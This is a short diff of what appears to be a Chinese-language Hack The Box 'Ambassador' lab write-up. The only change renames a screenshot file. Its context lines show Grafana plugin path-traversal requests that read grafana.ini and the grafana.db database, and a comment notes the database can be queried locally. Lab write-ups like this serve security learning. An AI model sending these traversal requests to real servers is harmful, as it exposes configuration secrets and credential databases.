@@ -64,7 +64,7 @@ GET /public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
 GET /public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
 ```
 
-![burp](../static/img/HTB_Ambassador_PoC.png)
+![burp](../static/img/HTB-Ambassador-PoC.png)
 
 *这里直接 `grep grafana.db` 会有什么bin文件报错。后来才发觉这个就真是整个DB库，可以在本地用SQL命令进行访问的*
 
